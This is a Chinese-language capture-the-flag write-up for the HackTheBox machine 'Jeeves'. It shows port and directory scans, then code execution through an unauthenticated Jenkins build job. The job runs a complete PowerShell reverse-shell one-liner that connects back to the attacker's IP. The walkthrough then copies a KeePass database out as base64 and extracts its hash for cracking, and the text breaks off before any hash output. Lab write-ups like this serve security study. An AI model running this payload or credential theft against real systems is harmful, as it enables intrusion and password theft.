---
title: HTB-Jeeves Writeup
date: 2026-10-14T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - Windows
  - Jenkins
  - SMB
  - NTLM
  - Impacket
  - Keepass
---
## Nmap 探测

使用 nmap 探测存活的端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ sudo nmap --min-rate 10000 -p- 10.129.228.112 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-13 21:48 -0400
Nmap scan report for 10.129.228.112
Host is up (0.11s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds
```

对存活的端口进行详细信息扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ sudo nmap -sT -sC -sV -O -p 80,135,445,50000 10.129.228.112 -oA Nmap/detail
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-13 22:18 -0400
Nmap scan report for 10.129.228.112
Host is up (0.11s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 11 (86%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h58m57s, deviation: 0s, median: 4h58m56s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-10-14T07:17:52
|_  start_date: 2026-10-14T06:44:49

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.14 seconds
```

## JENKINS 渗透

50000 端口显示 404。

![](Pasted%20image%2020261014104226.png)

80 端口是一个搜索框。

![](Pasted%20image%2020261014104309.png)

搜索框输入任意内容均会跳转 `error.html`。

![](Pasted%20image%2020261014104248.png)

使用 feroxbuster 爆破 50000 端口的目录，发现目录 `askjeeves`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ sudo feroxbuster -u http://10.129.228.112:50000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[sudo] password for kali:

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.228.112:50000/
 🚩  In-Scope Url          │ 10.129.228.112
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       11l       26w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves => http://10.129.228.112:50000/askjeeves/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/about => http://10.129.228.112:50000/askjeeves/about/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/security => http://10.129.228.112:50000/askjeeves/security/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/search => http://10.129.228.112:50000/askjeeves/search/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/projects => http://10.129.228.112:50000/askjeeves/projects/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/assets => http://10.129.228.112:50000/askjeeves/assets/
404      GET       14l      263w     7119c http://10.129.228.112:50000/askjeeves/search/index
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        4l       13w      204c http://10.129.228.112:50000/askjeeves/computer/updateNow
200      GET      126l      680w    17895c http://10.129.228.112:50000/askjeeves/log/rss
405      GET        4l       13w      218c http://10.129.228.112:50000/askjeeves/log/newLogRecorder
200      GET       16l      445w     9831c http://10.129.228.112:50000/askjeeves/log/index
405      GET        4l       13w      205c http://10.129.228.112:50000/askjeeves/computer/createItem
200      GET       35l      581w    12275c http://10.129.228.112:50000/askjeeves/computer/new
200      GET      114l      970w    23738c http://10.129.228.112:50000/askjeeves/log/all
200      GET       19l      449w    10067c http://10.129.228.112:50000/askjeeves/log/levels
200      GET       16l      410w     9432c http://10.129.228.112:50000/askjeeves/log/new
200      GET       22l      772w    17104c http://10.129.228.112:50000/askjeeves/computer/configure
200      GET       18l      540w    11766c http://10.129.228.112:50000/askjeeves/computer/index
200      GET        1l       17w      237c http://10.129.228.112:50000/askjeeves/log/feeds
404      GET       14l      269w     7280c http://10.129.228.112:50000/askjeeves/computer/search/index
200      GET       14l      470w    10638c http://10.129.228.112:50000/askjeeves/computers/0/markOffline
200      GET        1l        4w      547c http://10.129.228.112:50000/askjeeves/api/python
405      GET        4l       13w      207c http://10.129.228.112:50000/askjeeves/cancelQuietDown
200      GET        1l        8w      667c http://10.129.228.112:50000/askjeeves/api/xml
200      GET       16l      502w    11087c http://10.129.228.112:50000/askjeeves/safeRestart
405      GET        4l       13w      201c http://10.129.228.112:50000/askjeeves/quietDown
200      GET      394l     1050w    18730c http://10.129.228.112:50000/askjeeves/api/schema
405      GET        4l       13w      202c http://10.129.228.112:50000/askjeeves/createItem
200      GET       16l      469w    10782c http://10.129.228.112:50000/askjeeves/computers/0/index
403      GET        8l       10w      589c http://10.129.228.112:50000/askjeeves/me
404      GET       14l      269w     7253c http://10.129.228.112:50000/askjeeves/log/search/index
200      GET        1l        1w       13c http://10.129.228.112:50000/askjeeves/timeline/data
200      GET       14l      470w    10642c http://10.129.228.112:50000/askjeeves/computers/00/markOffline
200      GET       16l      469w    10786c http://10.129.228.112:50000/askjeeves/computers/00/index
200      GET       14l      558w    12077c http://10.129.228.112:50000/askjeeves/script
200      GET        1l       14w     2058c http://10.129.228.112:50000/askjeeves/computer/api/xml
200      GET        1l        6w     1510c http://10.129.228.112:50000/askjeeves/computer/api/json
200      GET        1l        6w     1510c http://10.129.228.112:50000/askjeeves/computer/api/python
200      GET      159l      469w     7530c http://10.129.228.112:50000/askjeeves/computer/api/schema
500      GET       98l      608w    15815c http://10.129.228.112:50000/askjeeves/widgets/01/index
500      GET       98l      608w    15814c http://10.129.228.112:50000/askjeeves/widgets/1/index
200      GET        1l        1w        9c http://10.129.228.112:50000/askjeeves/columns/06/column
500      GET       98l      608w    15816c http://10.129.228.112:50000/askjeeves/widgets/0/index
200      GET        2l       13w      222c http://10.129.228.112:50000/askjeeves/columns/01/column
200      GET        2l       13w      222c http://10.129.228.112:50000/askjeeves/columns/1/column
200      GET        1l        4w       50c http://10.129.228.112:50000/askjeeves/columns/02/column
200      GET        1l        4w       50c http://10.129.228.112:50000/askjeeves/columns/2/column
200      GET        1l        2w       21c http://10.129.228.112:50000/askjeeves/columns/3/column
200      GET        1l        1w        9c http://10.129.228.112:50000/askjeeves/columns/6/column
200      GET       14l     1193w    32469c http://10.129.228.112:50000/askjeeves/systemInfo
200      GET        1l        1w        9c http://10.129.228.112:50000/askjeeves/columns/0/column
200      GET       21l      869w    13696c http://10.129.228.112:50000/askjeeves/load-statistics
200      GET       96l     1086w    19788c http://10.129.228.112:50000/askjeeves/manage
200      GET        1l        2w       21c http://10.129.228.112:50000/askjeeves/columns/4/column
200      GET        1l        2w       21c http://10.129.228.112:50000/askjeeves/columns/03/column
200      GET        1l        2w       21c http://10.129.228.112:50000/askjeeves/columns/5/column
500      GET       96l      605w    15401c http://10.129.228.112:50000/askjeeves/assets/dynamic
200      GET       10l      140w    11642c http://10.129.228.112:50000/askjeeves/computers/0/script
405      GET        4l       13w      194c http://10.129.228.112:50000/askjeeves/gc
200      GET        1l        1w        9c http://10.129.228.112:50000/askjeeves/columns/00/column
200      GET        1l        1w       57c http://10.129.228.112:50000/askjeeves/search/suggest
400      GET       10l       17w     7091c http://10.129.228.112:50000/askjeeves/log/error
400      GET       14l      259w     7166c http://10.129.228.112:50000/askjeeves/computer/error
500      GET       10l       17w    15781c http://10.129.228.112:50000/askjeeves/views/0/main
200      GET        1l        1w       57c http://10.129.228.112:50000/askjeeves/computer/search/suggest
400      GET       13l      257w     7174c http://10.129.228.112:50000/askjeeves/computers/0/error
200      GET      134l      413w     5831c http://10.129.228.112:50000/askjeeves/timeline/control
405      GET       62l      126w     6380c http://10.129.228.112:50000/askjeeves/actions/01/index
200      GET        1l      562w     4848c http://10.129.228.112:50000/askjeeves/actions/03/index
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_129_228_112_50000_-1791946222.state ...
[###################>] - 14m  16997398/17204018 12m     found:69      errors:16786688
[####################] - 9m    220546/220546  423/s   http://10.129.228.112:50000/
[####################] - 8m    220546/220546  474/s   http://10.129.228.112:50000/askjeeves/
[####################] - 8m    220546/220546  485/s   http://10.129.228.112:50000/askjeeves/about/
[####################] - 7m    220546/220546  492/s   http://10.129.228.112:50000/askjeeves/security/
[####################] - 8m    220546/220546  488/s   http://10.129.228.112:50000/askjeeves/search/
[####################] - 7m    220546/220546  493/s   http://10.129.228.112:50000/askjeeves/projects/
[###################>] - 12m   219318/220546  305/s   http://10.129.228.112:50000/askjeeves/assets/
[####################] - 7m    220546/220546  519/s   http://10.129.228.112:50000/askjeeves/columns/
[####################] - 7m    220546/220546  524/s   http://10.129.228.112:50000/askjeeves/computers/
[####################] - 7m    220546/220546  523/s   http://10.129.228.112:50000/askjeeves/log/
[####################] - 7m    220546/220546  522/s   http://10.129.228.112:50000/askjeeves/columns/06/
[####################] - 7m    220546/220546  517/s   http://10.129.228.112:50000/askjeeves/columns/03/
[####################] - 7m    220546/220546  517/s   http://10.129.228.112:50000/askjeeves/columns/04/
[###################>] - 12m   220521/220546  310/s   http://10.129.228.112:50000/askjeeves/columns/05/
[####################] - 7m    220546/220546  518/s   http://10.129.228.112:50000/askjeeves/columns/01/
[####################] - 7m    220546/220546  523/s   http://10.129.228.112:50000/askjeeves/columns/2/
[####################] - 7m    220546/220546  524/s   http://10.129.228.112:50000/askjeeves/columns/1/
[####################] - 7m    220546/220546  522/s   http://10.129.228.112:50000/askjeeves/columns/02/
[####################] - 10m   220546/220546  370/s   http://10.129.228.112:50000/askjeeves/columns/3/
[####################] - 7m    220546/220546  519/s   http://10.129.228.112:50000/askjeeves/columns/4/
[###################>] - 12m   215188/220546  303/s   http://10.129.228.112:50000/askjeeves/columns/6/
[####################] - 7m    220546/220546  527/s   http://10.129.228.112:50000/askjeeves/columns/5/
[###################>] - 12m   215839/220546  304/s   http://10.129.228.112:50000/askjeeves/computer/
[####################] - 7m    220546/220546  528/s   http://10.129.228.112:50000/askjeeves/columns/0/
[####################] - 7m    220546/220546  524/s   http://10.129.228.112:50000/askjeeves/log/search/
[###################>] - 12m   212684/220546  301/s   http://10.129.228.112:50000/askjeeves/computers/0/
[####################] - 7m    220546/220546  539/s   http://10.129.228.112:50000/askjeeves/computer/search/
[####################] - 7s    220546/220546  29860/s http://10.129.228.112:50000/askjeeves/api/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7m    220546/220546  545/s   http://10.129.228.112:50000/askjeeves/channel/
[###################>] - 11m   215870/220546  313/s   http://10.129.228.112:50000/askjeeves/timeline/
[###################>] - 11m   219418/220546  320/s   http://10.129.228.112:50000/askjeeves/items/                                                                      
```

访问得到 Jenkins 的脚本控制台，不用登陆就能打开。

![](Pasted%20image%2020261014105350.png)

create new jos，freestyle project。

![](Pasted%20image%2020261014105937.png)

找到 execute windows command。

![](Pasted%20image%2020261014110023.png)

写入一个反弹 shell。

```bash
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.10.16.151',4444);$s=$c.GetStream();$b=New-Object byte[] 65536;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$o=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($o,0,$o.Length);$s.Flush()};$c.Close()"
```

![](Pasted%20image%2020261014135003.png)

build。

![](Pasted%20image%2020261014135158.png)

![](Pasted%20image%2020261014135235.png)

Kali 上开启监听，得到 jeeves\kohsuke。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ sudo rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.151] from (UNKNOWN) [10.129.228.112] 49678
C:\Users\Administrator\.jenkins\workspace\Test1> whoami
jeeves\kohsuke
```

## 提权

翻阅找到 CEH.kdbx，KeePass 数据库。

```bash
C:\Users\kohsuke\Documents> dir


    Directory: C:\Users\kohsuke\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx 
```

把这个库整个 base64 抄到 Kali。

```bash
C:\Users\kohsuke\Documents> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\kohsuke\Documents\CEH.kdbx'))
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

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ echo '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' | base64 -d > CEH.kdbx
```

确认文件类型和字节数正确，2846 字节，和原始文件一致。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ file CEH.kdbx                     
CEH.kdbx: Keepass password database 2.x KDBX
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ wc -c CEH.kdbx                                                            
2846 CEH.kdbx

```

使用 keepass2john 得到 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ keepass2john CEH.kdbx > kp.hash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ cat kp.hash
